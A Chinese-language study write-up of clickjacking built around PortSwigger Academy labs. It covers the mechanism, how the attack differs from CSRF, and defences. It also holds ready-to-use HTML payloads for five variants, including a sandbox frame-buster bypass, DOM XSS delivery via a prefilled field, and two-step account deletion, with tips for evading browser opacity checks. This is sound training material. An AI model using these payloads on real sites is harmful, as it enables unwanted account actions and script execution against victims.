# Clickjacking (UI Redressing) — 攻击机制深度分析

## 核心原理

Clickjacking 的核心是利用了浏览器安全模型中的一个根本性盲区：**浏览器渲染的是像素，而非语义意图**。当一个用户点击屏幕上的某个位置时，浏览器只能确定"用户在此坐标执行了点击操作"，却无法区分用户"认为自己点击了什么"和"实际点击了什么"。攻击者通过在 iframe 中加载目标网站并使用 CSS 将 iframe 设为透明并精确定位，使受害者以为自己点击的是诱饵页面上的内容，实则触发了隐藏的目标网站上的操作。

一句话总结：**Clickjacking 是对用户交互意图的劫持，而非对请求本身的伪造**——这一定位是理解它与 CSRF 根本区别的关键。

---

## 漏洞本质：浏览器设计中的结构性矛盾

### 为什么浏览器允许这种行为？

Clickjacking 之所以存在，根源在于 Web 平台的三个设计特性之间的张力：

1. **iframe 的可嵌入性** — 在默认情况下，任何页面都可以通过 `<iframe>` 嵌入任何其他页面。这是 Web 组合模型的基础——嵌入地图、视频、第三方支付页面都依赖此特性。
2. **CSS 的像素级控制** — `opacity`、`z-index`、`position` 等属性赋予了任意页面精确控制视觉呈现的能力，包括将元素设为不可见但依然可交互。
3. **浏览器缺乏意图推断能力** — 浏览器不知道用户"想"点击什么。它只记录事件坐标，将事件分发到该坐标上位于最顶层的可交互元素。

这三个特性各自都是合理的平台设计选择，但组合在一起产生了非预期的安全后果：一个页面可以欺骗用户不知情地操作另一个页面。

### 触发条件

Clickjacking 攻击成立需要同时满足以下前置条件：

- 目标网站可以被嵌入 iframe（即目标网站未设置 framing 限制）
- 目标网站上的关键操作可以通过单次或多次点击完成
- 目标网站对用户操作的认证依赖 session cookie（而非对每个操作进行二次确认）
- 攻击者能够诱使受害者访问诱饵页面

---

## Clickjacking 与 CSRF 的本质区别

PortSwigger 原文中有一个非常重要的区分——这也是实际工作中最常见的概念混淆点：

| 维度 | Clickjacking | CSRF |
|------|-------------|------|
| **攻击本质** | 劫持用户的交互意图（UI 层面） | 伪造用户的请求（HTTP 层面） |
| **用户是否需要操作** | 是——受害者必须点击 | 否——受害者只需浏览攻击页面 |
| **请求来源** | 合法的用户操作（浏览器正常发送） | 攻击者构造的跨域请求 |
| **CSRF Token 能否防御** | **不能**——请求由用户真实触发，token 是合法的 | 能——攻击者不知道 token 值 |
| **攻击发生的层面** | 浏览器渲染/UI 层 | HTTP 协议层 |
| **成功后服务器视角** | 一个合法的、authenticated 的用户请求 | 一个跨域伪造的、authenticated 的用户请求 |

关键洞察：**Clickjacking 场景中，目标服务器无法从请求本身区分正常操作和被劫持的操作**。因为请求中的 Cookie、CSRF Token、Referer、Origin 等一切 HTTP 层面的信息都是合法的——它们确实来自用户的浏览器，确实是用户触发的，所有状态都是真实的。攻击点不在 HTTP 层，而在人机交互层。

这也是为什么 Clickjacking 有时被称为"CSRF 的盲区"——它利用了 CSRF 防御体系的根本假设（"验证请求来源和 token 就够了"）之外的攻击面。

---

## 攻击变体

### 1. 基础 Clickjacking（单步骤）

**工作机制**：攻击者创建诱饵页面，通过 `position: absolute/relative` 和 `z-index` 将透明的目标 iframe 精确定位在诱饵按钮之上。受害者看到的是一件事（"点击领取奖品"），实际触发的是另一件事（"确认转账"或"删除账户"）。

**核心技术要素**：
- `opacity: 0.00001` 而非 `opacity: 0`——完全透明（`0`）可能被浏览器的防 clickjacking 启发式检测拦截（Chrome 76+ 的分析表明基于阈值的透明度检测是可行的，但 Firefox 至今未实现此行为）
- `z-index` 控制层叠顺序，确保 iframe 在最顶层接收点击事件
- 精确的 CSS 定位计算，使目标按钮与诱饵按钮重叠

**局限性**：仅适用于目标网站上可以通过单次点击完成的操作（如确认按钮、关注按钮、点赞按钮）。

**Lab 场景**：目标网站"删除账户"功能受 CSRF token 保护，传统 CSRF 攻击无法伪造请求。但由于页面未设置 framing 限制，攻击者构造诱饵页面，将透明的目标 iframe 中的"Delete account"按钮通过 CSS 精确定位到诱饵"Click me"按钮之上。受害者点击诱饵按钮时，实际点击的是目标网站的删除按钮，请求携带着由用户浏览器发出的合法 CSRF token 和服务端 session cookie，服务器无法区分这是正常操作还是 clickjacking 攻击。

**变量说明**：

| 变量                          | 含义                                                                                        |
| --------------------------- | ----------------------------------------------------------------------------------------- |
| `--iframe-w` / `--iframe-h` | iframe 的宽高，需足够覆盖目标页面的完整区域（通常 700px-800px 宽、500px-700px 高）                                 |
| `--decoy-x` / `--decoy-y`   | 诱饵 `<div>` 的 `left` 和 `top` 偏移量，需与 iframe 内目标按钮的位置对齐。值取决于目标按钮在页面中的坐标（通过浏览器 DevTools 测量获得） |
| `--opacity`                 | iframe 透明度，设为极小非零值（如 `0.00001`）以绕过浏览器的完全透明 iframe 点击拦截                                    |
| `z-index`                   | 控制层叠顺序——iframe 设为较高值（如 2），确保其在上层接收点击事件；诱饵 div 设为较低值（如 1），在视觉上被 iframe 覆盖                  |

**涉及 CSS 属性**：

| 属性                            | 作用                                                                       |
| ----------------------------- | ------------------------------------------------------------------------ |
| `position: relative` (iframe) | 为 iframe 建立定位上下文，使其可被后续的 z-index 层叠控制                                    |
| `position: absolute` (div)    | 将诱饵 div 从正常流中取出，通过 `top`/`left` 精确定位到与目标按钮重叠的位置                          |
| `z-index`                     | 控制层叠顺序——iframe 设为较高值（如 2），确保其在上层接收点击事件；诱饵 div 设为较低值（如 1），在视觉上被 iframe 覆盖 |
| `opacity`                     | 控制 iframe 透明度——值越小越不可见，但不能为 0（会被浏览器反 clickjacking 检测拦截）                  |

```html
<style>
    iframe {
        position: relative;
        width: var(--iframe-w, 700px);
        height: var(--iframe-h, 500px);
        opacity: var(--opacity, 0.00001);
        z-index: 2;
    }
    div {
        position: absolute;
        top: var(--decoy-y, 495px);
        left: var(--decoy-x, 70px);
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```

> 实际使用时将 CSS 变量替换为测量值：打开目标页面，F12 DevTools 选中目标按钮，从 Computed 面板获取其在页面中的坐标作为 `--decoy-x` 和 `--decoy-y`。

### 2. 预填充表单 Clickjacking

**工作机制**：利用某些网站允许通过 URL 查询参数预设表单字段值的行为。攻击者将目标 URL 构造为携带预设值（如 `?email=attacker@evil.com&amount=1000`），然后将透明的 iframe 中的提交按钮与诱饵按钮对齐。

**关键前提**：目标网站的表单支持 GET 参数预填充。这本身不是漏洞——是一个设计选择——但该选择扩大了 clickjacking 的攻击面。

**利用方式**：攻击者可以控制表单内容，只需受害者执行最后的点击确认即可完成攻击。

**Lab 场景**：目标网站的联系表单支持通过 URL 查询参数预填充字段值（如 `?email=attacker@evil.com&subject=malicious`）。攻击者构造包含预设攻击数据的 URL 作为 iframe 的 `src`，页面加载后表单字段已被自动填入攻击者控制的值。攻击者只需将 iframe 中的提交按钮与诱饵按钮对齐，受害者的一次点击即可提交携带攻击者预设内容的表单，而受害者对此毫不知情。

**变量说明**：

| 变量 | 含义 |
|------|------|
| `--iframe-w` / `--iframe-h` | iframe 宽高，覆盖目标表单页面区域 |
| `--decoy-x` / `--decoy-y` | 诱饵 div 的 `left`/`top`，与 iframe 内"Submit"/"Update"提交按钮对齐 |
| `--opacity` | iframe 透明度，极小非零值绕过浏览器检测 |
| `--prefill-params` | URL 查询字符串，承载攻击者预设的表单值（如 `?email=hacker@evil.net`）。目标网站必须支持通过 GET 参数预填充表单字段 |

**涉及 CSS 属性**：同变体 1——`position: relative`（iframe 定位上下文）、`position: absolute` + `top`/`left`（诱饵精确定位）、`z-index`（层叠控制，iframe 在上）、`opacity`（透明但不可为零）。

```html
<style>
    iframe {
        position: relative;
        width: var(--iframe-w, 700px);
        height: var(--iframe-h, 500px);
        opacity: var(--opacity, 0.00001);
        z-index: 2;
    }
    div {
        position: absolute;
        top: var(--decoy-y, 460px);
        left: var(--decoy-x, 70px);
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@evil.net"></iframe>
```

> `--prefill-params` 体现在 iframe `src` 的查询字符串中。实际攻击时替换 `email` 参数值为攻击者控制的邮箱地址。

### 3. Frame Buster 绕过

**Frame busting 脚本**是最早的客户端防御方案（使用 `if (top !== self) top.location = self.location` 等 JavaScript 逻辑），但存在系统性缺陷：

- **JavaScript 依赖**：浏览器可禁用 JavaScript；某些安全扩展（如 NoScript）就以此为默认行为
- **sandbox 属性绕过**：HTML5 的 `<iframe sandbox="allow-forms">` 允许 iframe 内表单提交，但不允许脚本执行——恰好中和了 frame buster 的所有防御。省略 `allow-top-navigation` 阻止了 `top.location` 重定向
- **浏览器差异**：frame busting 代码通常只对特定浏览器有效

**根本性问题**：客户端 JavaScript 防御在对抗 clickjacking 时存在逻辑悖论——防御代码必须运行在被嵌入的上下文中，但攻击者控制着框架的属性和环境。这是一个"在同一层面对抗"的策略错误。

**Lab 场景**：目标页面内嵌了 frame busting 脚本（`if (top !== self) top.location = self.location`），试图阻止自身被嵌入。但攻击者使用 `<iframe sandbox="allow-forms">` 嵌入目标页面——`sandbox` 属性默认禁止 JavaScript 执行（除非 `allow-scripts` 被显式声明），frame buster 脚本因此完全失效。同时 `allow-forms` 确保表单提交功能正常，因为 sandbox 的默认限制只影响脚本和顶层导航，不阻止表单提交。攻击者利用这一属性差异，将 frame buster 防御彻底架空。

**变量说明**：

| 变量 | 含义 |
|------|------|
| `--iframe-w` / `--iframe-h` | iframe 宽高，覆盖目标页面区域 |
| `--decoy-x` / `--decoy-y` | 诱饵 div 的 `left`/`top`，与目标按钮对齐 |
| `--opacity` | iframe 透明度，极小非零值 |
| `--sandbox-flags` | `sandbox` 属性值。绕过 frame buster 的关键：不包含 `allow-scripts`（禁 JS），但需包含 `allow-forms`（允许表单提交）。`allow-top-navigation` 也需省略以阻止 `top.location` 重定向 |

**涉及 CSS 属性**：同变体 1。额外涉及 HTML 属性：

| 属性 | 作用 |
|------|------|
| `sandbox="allow-forms"` | 对 iframe 施加沙箱限制：默认禁用 JS、弹窗、插件、顶层导航和同源访问；`allow-forms` 将表单提交从限制中豁免。由于 frame buster 依赖 JS 和 `top.location` 重定向，sandbox 的默认限制恰好使其全部失效 |

```html
<style>
    iframe {
        position: relative;
        width: var(--iframe-w, 700px);
        height: var(--iframe-h, 500px);
        opacity: var(--opacity, 0.00001);
        z-index: 2;
    }
    div {
        position: absolute;
        top: var(--decoy-y, 495px);
        left: var(--decoy-x, 70px);
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe sandbox="allow-forms" src="https://YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```

> `sandbox="allow-forms"` 是本 payload 的核心——只需这一个 HTML 属性，frame buster 的 JS 逻辑和新页面重定向全部失效。

### 4. Clickjacking 作为其他攻击的载体（与 DOM XSS 结合）

这是 Clickjacking 真正强大的用法：**Clickjacking 本身通常不直接产生价值（除非是点赞、关注等社交行为），但它可以作为更危险攻击的传递机制。**

工作流程：
1. 攻击者发现目标网站存在 DOM XSS 漏洞，但该 XSS 需要通过特定用户交互触发（如点击某个链接）
2. 攻击者将 XSS payload 编码到 iframe 的 URL 中
3. 攻击者通过 clickjacking 诱使用户点击触发 XSS 的链接
4. XSS 在目标 origin 下执行，可读取 cookie、localStorage、DOM 内容

**Clickjacking 在此充当的角色**：将受害者原本不会触发的交互变为"不可见但被执行"的操作。

**Lab 场景**：目标网站有一个反馈表单（`/feedback`），表单的 `name` 字段支持 URL 参数预填充。页面 JS 在表单提交后，将 `name` 参数的值通过 `innerHTML` 直接写入 DOM。由于无任何 sanitization，`name` 成为 DOM XSS 的注入点。但该 XSS 需要用户点击"Submit feedback"按钮才能触发——clickjacking 充当了这次点击的"触发器"。

**漏洞代码分析**（目标页面实际 JavaScript）：

```javascript
document.getElementById("feedbackForm").addEventListener("submit", function(e) {
    submitFeedback(
        this.getAttribute("method"),      // POST
        this.getAttribute("action"),      // /feedback/submit
        this.getAttribute("enctype"),     // application/x-www-form-urlencoded
        this.getAttribute("personal"),    // "true" — 决定是否将 name 写入 DOM
        new FormData(this)                // 包含 name/email/subject/message
    );
    e.preventDefault();
});

function submitFeedback(method, path, encoding, personal, data) {
    var XHR = new XMLHttpRequest();
    XHR.open(method, path);
    if (personal) {
        // [关键] personal="true" 时，将 name 值传入 displayFeedbackMessage
        XHR.addEventListener("load", displayFeedbackMessage(data.get('name')));
    } else {
        XHR.addEventListener("load", displayFeedbackMessage());
    }
    // ... XHR 发送逻辑 ...
}

function displayFeedbackMessage(name) {
    return function() {
        var feedbackResult = document.getElementById("feedbackResult");
        if (this.status === 200) {
            // [SINK] name 未经任何转义直接拼入 innerHTML
            feedbackResult.innerHTML =
                "Thank you for submitting feedback" + (name ? ", " + name : "") + "!";
            feedbackForm.reset();
        }
    };
}
```

**数据流追踪（Source -> Sink）**：

```
URL ?name=<img src=x onerror=print()>    ← [Source] 攻击者通过 iframe src 注入
  → 表单 <input name="name"> 预填充          URL 参数自动填入表单字段
  → 用户点击 "Submit feedback"              ← Clickjacking 在此介入
  → FormData(this) 收集字段值
  → data.get('name') 取出 payload
  → displayFeedbackMessage(payload)
  → feedbackResult.innerHTML = "..." + payload  ← [Sink] 直接写入 DOM
  → 浏览器解析 <img>，onerror 触发 print()
```

> 核心要点：`personal="true"` 属性使 `name` 值走入 `innerHTML` 路径。如果没有 clickjacking，受害者不会主动提交这个包含 XSS payload 的表单——clickjacking 解决了"如何让受害者触发"的问题。

**变量说明**：

| 变量 | 含义 |
|------|------|
| `--iframe-w` / `--iframe-h` | iframe 宽高 |
| `--decoy-x` / `--decoy-y` | 诱饵 div 的 `left`/`top`，与"Submit feedback"提交按钮对齐 |
| `--opacity` | iframe 透明度 |
| `--xss-payload` | URL 编码后的 XSS payload，对应注入到 `name` 参数的内容（本例 `<img src=x onerror=print()>`，可替换为 cookie 窃取等） |
| `--form-fields` | 其余表单字段（`email`/`subject`/`message`）的填充值，需满足非空以通过客户端验证 |

**涉及属性**：CSS 层叠/定位属性同变体 1。额外关注 iframe `src` 中的 URL 编码——`<` `>` `=` 空格等字符可能编码当原始字符不能通过时尝试编码（`%3C` `%3E` `%3D` `+`），浏览器解析 URL 时可能截断或破坏 payload 结构。

```html
<style>
    iframe {
        position: relative;
        width: var(--iframe-w, 700px);
        height: var(--iframe-h, 500px);
        opacity: var(--opacity, 0.00001);
        z-index: 2;
    }
    div {
        position: absolute;
        top: var(--decoy-y, 460px);
        left: var(--decoy-x, 70px);
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/feedback?name=%3Cimg+src%3Dx+onerror%3Dprint()%3E&email=test@test.com&subject=test&message=test"></iframe>
```

> `name=%3Cimg+src%3Dx+onerror%3Dprint()%3E` 是 `<img src=x onerror=print()>` 的 URL 编码。受害者 clickjack 点击提交后，payload 经 `FormData` -> `displayFeedbackMessage` -> `innerHTML` 在目标 origin 执行。

### 5. 多步骤 Clickjacking

**工作机制**：将多个单步骤 clickjacking 编排为序列。某些目标操作需要多步确认（如"删除账户"→点击"Yes"确认），攻击者需要在每个步骤将透明 iframe 中的目标按钮与诱饵对齐，引导受害者无感知地完成全部操作。

**Lab 场景**：目标网站的"删除账户"操作需要两步——第一步在账户页点击"Delete account"按钮，第二步在确认页点击"Yes"按钮。攻击者利用 clickjacking 诱使受害者依次完成这两次点击。

#### 5.1 核心概念：为什么是"透明玻璃"而非"遮罩"

这是 Clickjacking 中最容易误解的地方。直觉上会以为"诱饵 div 挡在 iframe 前面，用户点击诱饵时穿透到 iframe"——**这是错的**。实际的层叠关系是反过来的：

```
z-index: 2  →  iframe（透明，opacity: 0.0001）   ← 用户的手指实际接触这一层
z-index: 1  →  诱饵 div（"Click me first"）     ← 用户的眼睛看到这一层
```

**用类比理解**：你在桌上放了一张写有"Click me"的纸（诱饵 div），然后在纸上盖了一块完全透明的玻璃（透明 iframe）。别人透过玻璃看到纸上写着"Click me"，于是去点击那个位置——但手指实际碰到的是玻璃，不是纸。如果玻璃下方恰好有一个真实按钮，点击就落到了那个按钮上。

**关键结论**：iframe 必须在诱饵的**上方**（更高的 z-index），同时**完全透明**（opacity 极低但不为零）。用户的视觉系统被下方的诱饵文字引导，但点击事件被上方的透明 iframe 拦截。

#### 5.2 两种实现方案对比

PortSwigger 官方解法（单 iframe）和双 iframe + JS 切换方案在原理上完全相同，区别仅在于步骤切换机制：

| 对比维度 | 单 iframe 方案（官方推荐） | 双 iframe + JS 切换方案 |
|---------|--------------------------|----------------------|
| **iframe 数量** | 1 个 | 2 个 |
| **诱饵可见性** | 两个诱饵从始至终可见 | 每步只显示当前诱饵，另一个 `display: none` |
| **步骤切换机制** | iframe 自身的页面导航——第一步点击后目标页面自然跳转到确认页 | JavaScript 监听点击事件，手动切换步骤容器的 `display` |
| **依赖项** | 无 JS 依赖，仅靠浏览器默认行为 | 依赖 JS 执行 |
| **第二步 iframe src** | 同第一步（始终为 `/my-account`），靠页面导航进入确认页 | 直接指向确认页 URL（`/my-account/delete?confirm=1`），预先加载 |
| **适用场景** | 大多数情况，PortSwigger 官方推荐 | iframe 导航时序有问题时作为备选 |

#### 5.3 单 iframe 方案详解（PortSwigger 官方解法）

**页面结构（侧视图）**：

```
攻击页面 (body)
│
├── iframe  (z-index: 2, opacity: 0.0001)  ← 透明玻璃，最高层
│   └── 目标网站 /my-account
│       ├── [Delete account] 按钮1
│       └── (点击后导航到确认页 /my-account/delete?confirm=1)
│           └── [Yes] 按钮2
│
├── <div class="firstClick">   (z-index: 1)  ← 诱饵1，与按钮1对齐
└── <div class="secondClick">  (z-index: 1)  ← 诱饵2，与按钮2对齐
```

**为什么两个诱饵从一开始就都可见？**

因为只有一个 iframe，其内容随页面导航变化：

1. **初始状态**：iframe 显示账户页面。诱饵1（"Click me first"）下方是"Delete account"按钮，两者对齐。诱饵2虽然可见，但下方是账户页的空白区域——确认页的"Yes"按钮尚不存在。
2. **第一次点击后**：用户点击"Click me first" → 实际点击的是 iframe 中的"Delete account" → 页面导航到确认页 → iframe 刷新显示确认页。此时"Yes"按钮恰好出现在诱饵2下方。
3. **第二次点击后**：用户点击"Click me next" → 实际点击的是确认页的"Yes"按钮 → 删除完成。

步骤切换完全由目标网站自身的页面导航完成，攻击页面**不需要任何 JavaScript**。

**操作时间线**：

```
iframe 内容:  [账户页面]  ──点击1──→  [确认页面]  ──点击2──→  [删除成功]
              按钮1在此              按钮2在此

诱饵1:        "Click me first"      (悬空)                 (悬空)
              ↑ 对齐按钮1

诱饵2:        "Click me next"       "Click me next"        (点击完成)
              (悬空)                ↑ 对齐按钮2
```

**官方 payload（保留占位变量）**：

```html
<style>
    iframe {
        position: relative;
        width: $width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    .firstClick, .secondClick {
        position: absolute;
        top: $top_value1;
        left: $side_value1;
        z-index: 1;
    }
    .secondClick {
        top: $top_value2;
        left: $side_value2;
    }
</style>
<div class="firstClick">Test me first</div>
<div class="secondClick">Test me next</div>
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```

**变量说明与官方建议值**：

| 变量              | 含义              |
| --------------- | --------------- |
| `$width_value`  | iframe 宽度       |
| `$height_value` | iframe 高度       |
| `$opacity`      | iframe 透明度      |
| `$top_value1`   | 诱饵1 的 `top` 偏移  |
| `$side_value1`  | 诱饵1 的 `left` 偏移 |
| `$top_value2`   | 诱饵2 的 `top` 偏移  |
| `$side_value2`  | 诱饵2 的 `left` 偏移 |

> 建议值是官方给出的参考值，不同 Lab 实例的页面布局可能略有差异。调试时先用 `opacity: 0.1` 观察对齐情况，按需微调 `top`/`left` 值。

**CSS 属性逐一说明**：

| 属性 | 作用于 | 值 | 为什么这样设置 |
|------|--------|-----|--------------|
| `position: relative` | iframe | `relative` | 为 iframe 建立定位上下文，使其可参与 z-index 层叠（`position: static` 的元素忽略 z-index） |
| `position: absolute` | 诱饵 div | `absolute` | 将 div 从正常文档流中取出，通过 `top`/`left` 精确放置 |
| `z-index: 2` | iframe | `2` | 使 iframe 位于诱饵 div 上方，拦截所有点击事件 |
| `z-index: 1` | 诱饵 div | `1` | 使诱饵位于 iframe 下方，只起视觉引导作用，不接收点击 |
| `opacity` | iframe | `0.0001` | 让人眼完全看不到 iframe。不能为 0——Chrome 76+ 的启发式检测会拦截对 `opacity: 0` 的 iframe 的点击 |

**对齐调试流程**：

1. 将 `$opacity` 设为 `0.1`（半透明），以便肉眼观察 iframe 内容与诱饵的相对位置
2. 打开目标网站 `/my-account`，F12 DevTools 选中"Delete account"按钮，获取其在页面中的坐标，填入 `$top_value1` / `$side_value1`
3. 手动点击"Delete account"进入确认页 `/my-account/delete?confirm=1`，同样获取"Yes"按钮坐标，填入 `$top_value2` / `$side_value2`
4. 在攻击页面用 DevTools 元素选择器高亮 `.firstClick` 和 `.secondClick`，检查高亮框是否与半透明 iframe 中对应按钮重叠
5. 悬停在"Test me first"上方，确认光标变为手型（表示下方有可点击元素）；点击后悬停"Test me next"，同样确认手型光标
6. 对齐无误后，将 `$opacity` 改为 `0.0001`，将诱饵文字改为"Click me first" / "Click me next"

#### 5.4 双 iframe + JS 切换方案（备选）

此方案使用两个独立的步骤容器，通过 JavaScript 切换 `display`。第二步的 iframe 直接指向确认页 URL，不依赖页面导航。

**与单 iframe 方案的关键区别**：第二步 iframe 的 `src` 直接设为 `/my-account/delete?confirm=1`，确认页已预加载。适用于单 iframe 方案因导航时序问题导致第二步点击失效的情况。

```html
<style>
    .step {
        position: relative;
        width: var(--step-w, 700px);
        height: var(--step-h, 500px);
    }
    iframe {
        width: var(--iframe-w, 700px);
        height: var(--iframe-h, 500px);
        opacity: var(--opacity, 0.0001);
        position: absolute;
        top: 0;
        left: 0;
        z-index: 2;
    }
    .click-target {
        position: absolute;
        z-index: 1;
        font-size: 14px;
        background: #ddd;
        padding: 5px 15px;
    }
    .step1-target { top: var(--decoy1-y, 330px); left: var(--decoy1-x, 50px); }
    .step2-target { top: var(--decoy2-y, 285px); left: var(--decoy2-x, 225px); }
</style>

<div class="step" id="step1">
    <div class="click-target step1-target">Click me first</div>
    <iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
</div>

<div class="step" id="step2" style="display:none;">
    <div class="click-target step2-target">Click me second</div>
    <iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account/delete?confirm=1"></iframe>
</div>

<script>
    var currentStep = 1;
    document.addEventListener('click', function() {
        if (currentStep === 1) {
            document.getElementById('step1').style.display = 'none';
            document.getElementById('step2').style.display = 'block';
            currentStep = 2;
        }
    });
</script>
```

> 变量含义与单 iframe 方案相同，CSS 变量（`var(--xxx, 默认值)`）形式可替换为实际像素值。

#### 5.5 常见错误

| 错误 | 后果 | 纠正 |
|------|------|------|
| **诱饵 z-index 高于 iframe** | 用户点击的是空诱饵 div，点击不会传给 iframe 内的目标按钮，攻击完全失效 | iframe z-index 必须大于诱饵 z-index。记住"透明玻璃"类比——玻璃在上，纸在下 |
| **opacity 设为 0** | Chrome 76+ 拦截对完全透明 iframe 的点击 | 使用 `0.0001`（官方建议值）而非 `0` |
| **两个诱饵坐标搞反** | 第一步点击落在确认页"Yes"位置（但确认页尚未加载）；第二步点击落在账户页"Delete account"位置（但 iframe 已导航到确认页） | 第一步诱饵对准账户页按钮坐标，第二步对准确认页按钮坐标，分别测量 |
| **iframe 高度不够** | 目标按钮在 iframe 视口之外，点击落在 iframe 空白区域 | iframe 高度至少 700px |
| **双 iframe 方案中第二步 src 缺少确认参数** | 第二步 iframe 仍显示账户页而非确认页，"Yes"按钮不存在 | 确认第二步 iframe src 为 `/my-account/delete?confirm=1` |
| **调试时直接用 0.0001 不透明 iframe** | 完全看不到 iframe 内容，无法判断对齐 | 调试阶段 opacity 设为 `0.1`，对齐确认后再改为 `0.0001` |

---

## 防御体系分析

### 防御演进路径

```
Frame Busting Scripts (2000s)
  → X-Frame-Options (2008, IE8)
    → CSP frame-ancestors (2012, CSP 1.0)
      → 两者结合的多层防御（当前最佳实践）
```

### X-Frame-Options

| 指令 | 行为 | 浏览器支持 |
|------|------|-----------|
| `DENY` | 禁止任何页面嵌入本页 | 全部主流浏览器 |
| `SAMEORIGIN` | 仅允许同源页面嵌入 | 全部主流浏览器 |
| `ALLOW-FROM https://...` | 仅允许指定域名嵌入 | **已废弃**——Chrome 76+ 和 Safari 12+ 不支持 |

**关键缺陷**：`ALLOW-FROM` 指令在 Chrome 和 Safari 中从未被完整支持，使得精细化的白名单控制在 X-Frame-Options 层面无法可靠实现。这是推动行业迁移到 CSP `frame-ancestors` 的主要动力。

### CSP frame-ancestors

`frame-ancestors` 是 CSP 规范中专门用于控制页面可被哪些源嵌入的指令。相较于 X-Frame-Options：

- 支持**多个来源**白名单（`frame-ancestors example.com api.example.com`）
- 支持**灵活的模式匹配**（通配符子域名）
- Chrome、Firefox、Safari 均完整支持

推荐配置：
```
Content-Security-Policy: frame-ancestors 'self'
Content-Security-Policy: frame-ancestors 'none'
Content-Security-Policy: frame-ancestors trusted-partner.com
```

### 防御策略对比

| 策略 | 防御类型 | 有效性 | 限制 |
|------|---------|--------|------|
| **X-Frame-Options** | 服务端 HTTP 头 | 中等 | ALLOW-FROM 无 Chrome/Safari 支持；仅支持单域名或不支持白名单 |
| **CSP frame-ancestors** | 服务端 HTTP 头 | 高（当前推荐） | 依赖浏览器正确实现 CSP |
| **Frame busting scripts** | 客户端 JavaScript | **低（不应依赖）** | 可被 sandbox 属性绕过；JS 可能被禁用 |
| **SameSite Cookies** | 服务端 Cookie 属性 | 间接辅助 | 限制 cookie 在跨站请求中的发送，但不能阻止 framing |
| **用户交互确认** | 应用层设计 | 高 | 降低用户体验；适合高风险操作 |

### 纵深防御建议

对于一个足够安全的部署，推荐以下多层策略：

1. **CSP frame-ancestors** 作为主要防御（服务端 HTTP 响应头）
2. **X-Frame-Options** 作为兼容层（对不支持 CSP 的旧版浏览器提供基本保护）
3. **关键操作增加用户确认步骤**（如输入密码、验证码）——即便页面被 clickjack，多步操作增加了攻击复杂度
4. **废弃 frame busting scripts**——已经被证明不可靠，不应作为防御策略的一部分

---

## 常见误解与澄清

| 误解 | 事实 |
|------|------|
| "CSRF Token 可以防御 Clickjacking" | 不能。clickjacking 中的请求是由用户真实操作触发的，token 合法存在于请求中 |
| "设置了 `X-Frame-Options: SAMEORIGIN` 就完全安全了" | 该头只能防止页面被其他 origin 嵌入，不能防止同源页面内的 clickjacking。此外 ALLOW-FROM 在 Chrome/Safari 中不被支持 |
| "`opacity: 0` 和 `opacity: 0.00001` 效果一样" | 不一样。Chrome 76+ 有针对完全透明 iframe 的点击保护（threshold-based detection），完全透明可能被拦截，极低但不为零的 opacity 值用于绕过此检测 |
| "Clickjacking 只能做点赞这种小事" | 与 DOM XSS 结合后，clickjacking 可以触发任意 JavaScript 执行，危害等同于 XSS；多步骤 clickjacking 可以完成购买、转账等复杂操作 |
| "防火墙/WAF 可以防御 Clickjacking" | Clickjacking 是浏览器端的 UI 问题，WAF 无法检测或阻止——网络层看不到 CSS 层叠和用户点击坐标 |

---

## PortSwigger Academy 相关 Labs

| Lab 名称 | 难度 | 考点 |
|---------|------|------|
| Basic clickjacking with CSRF token protection | Apprentice | 理解 clickjacking 绕过 CSRF 防御的原理 |
| Clickjacking with form input data prefilled from a URL parameter | Apprentice | URL 参数预填充 + clickjacking |
| Clickjacking with a frame buster script | Apprentice | sandbox 属性绕过 frame busting |
| Exploiting clickjacking vulnerability to trigger DOM-based XSS | Practitioner | Clickjacking 作为 DOM XSS 载体 |
| Multistep clickjacking | Practitioner | 多步骤操作编排 |

## 参考资料

- PortSwigger Academy: Clickjacking (UI redressing)
- CWE-1021: Improper Restriction of Rendered UI Layers or Frames
- OWASP: Clickjacking Defense Cheat Sheet
- CSP Level 2: frame-ancestors directive (W3C)
- Hansen & Grossman (2008): "Clickjacking" — 最早系统描述该攻击的安全研究
- Chrome Platform Status: `X-Frame-Options: ALLOW-FROM` deprecation (Chrome 76)
- HTML5 Spec: iframe sandbox attribute
